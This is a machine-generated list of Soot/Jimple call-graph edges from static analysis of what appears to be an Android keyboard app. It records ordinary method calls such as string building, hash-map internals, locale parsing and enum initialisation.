STATIC edge: $r3 = staticinvoke <java.lang.Thread: java.lang.Thread currentThread()>() in <ojg: void v(java.lang.String)> ==> <java.lang.Thread: java.lang.Thread currentThread()>
STATIC edge: $r3 = staticinvoke <lme: lmb g()>() in <hbv: void j()> ==> <lme: lmb g()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r15.<mag: void <init>(java.lang.String,int,int)>("BITMOJI_IMAGE", 15, 15) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Error: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <miv: void <init>(java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lvr: boolean isEmpty()>() in <lvt: boolean a()> ==> <java.util.AbstractMap: boolean isEmpty()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r4, $i0) in <lsn: void q(lsz,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int j()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: $z0 = staticinvoke <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>($r2, $r3, $l0, $r1) in <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)> ==> <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i3, $i6) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <lum: lvm i()>() in <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)> ==> <lum: lvm i()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r4, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
STATIC edge: $r4 = staticinvoke <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>($r3, $r1, $i0, $r2) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(7) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r4, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String e(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <iwt: java.lang.String e(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_GRPC_FEATURE", 16, 16) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r22.<mag: void <init>(java.lang.String,int,int)>("LOCAL", 22, 22) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
CLINIT edge: staticinvoke <androidx.core.content.FileProvider: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <androidx.core.content.FileProvider: void <clinit>()>
CLINIT edge: staticinvoke <jsg: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jsg: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<ljs: void <init>()>() in <ljs: void <clinit>()> ==> <ljs: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(17) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <lak: void <init>(byte[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lnd: java.lang.Object a(int)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(long[],long[])>($r10, $r11) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(long[],long[])>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(16) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>(null, null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
SPECIAL edge: specialinvoke $r4.<hbv: void <init>(java.lang.String)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean k(char)>
VIRTUAL edge: virtualinvoke $r3.<hbv: void k(java.lang.Object,boolean)>($r1, 0) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hbv: void k(java.lang.Object,boolean)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(19) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r3, $r4) in <lqm: java.lang.Object get(int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r6, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Gif", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r1.<java.util.NoSuchElementException: void <init>()>() in <lnc: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $l0 = virtualinvoke $r0.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/r;", "lockState") in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lkq: boolean isEmpty()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r4.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
CLINIT edge: staticinvoke <lqr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqr: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i5, $r2) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int b()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r3, 0, $i0) in <ivv: ivw b(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "parser") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>($r5, $r0, $r1, $r2, $r3) in <iwt: void <clinit>()> ==> <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<lsm: int a(lsz)>($r2) in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: int a(lsz)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lkx: lma p()>() in <llg: void <init>(llo)> ==> <lkx: lma p()>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <iwt: java.lang.String c(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>() in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r1, $i1) in <lri: void v(java.lang.Object[],int)> ==> <lri: void t(java.lang.Object,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "log site qualifier") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean y(char)>($c5) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean y(char)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: void j(java.lang.Object)> ==> <lma: int e(int)>
VIRTUAL edge: $r1 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hcb: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null languageTag") in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<ing: void <init>(java.lang.String,iec)>($r2, $r3) in <iej: void g(java.lang.String,iec)> ==> <ing: void <init>(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <miv: void <clinit>()> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(5) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>(null) in <miv: void <clinit>()> ==> <miv: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <ivv: void <init>(byte[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, 1, $i1) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("PlaystoreStickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <lwg: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke $r3.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_THUMBNAIL", 3, 3) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int compareTo(java.lang.Enum)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>("array index scale not a power of two") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $l0 = staticinvoke <java.lang.System: long currentTimeMillis()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long currentTimeMillis()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String c(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
STATIC edge: $i0 = staticinvoke <kwe: int O(long,long)>($l1, $l2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kwe: int O(long,long)>
VIRTUAL edge: $r9 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <ltr: java.lang.Object d(lsz)>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
CLINIT edge: staticinvoke <bel: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <bel: void <clinit>()>
CLINIT edge: staticinvoke <idq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <idq: void <clinit>()>
CLINIT edge: staticinvoke <lqc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqc: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("cja-XA", "doi-XA", "doi-XD", "doi-XU", "doi-Deva", "doi-Latn", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getKey()>
CLINIT edge: staticinvoke <lwh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwh: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r2, $i1, $r3, 0, $i0) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r2, $i2) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r14 = staticinvoke <lkq: lkl e()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkq: lkl e()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <ltr: void <init>()> ==> <lts: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(16) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lnd: void <init>(java.lang.Object[])>($r1) in <lnd: void <clinit>()> ==> <lnd: void <init>(java.lang.Object[])>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <hnt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnt: void <clinit>()>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r21.<mag: void <init>(java.lang.String,int,int)>("CURATED_IMAGE", 21, 21) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
CLINIT edge: staticinvoke <mag: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <mag: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(8) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "transferIndex") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("invalid tag type: ") in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>("zh-CN", "com.google.android.inputmethod.pinyin", "zh-TW", "com.google.android.apps.inputmethod.zhuyin", "zh-HK", "com.google.android.apps.inputmethod.cantonese", "ko", "com.google.android.inputmethod.korean") in <hnt: void <clinit>()> ==> <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>($r1) in <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentShift", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r1, $i0, 0, $i1) in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r19.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_CREATE", 19, 19) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <lsm: int b()>
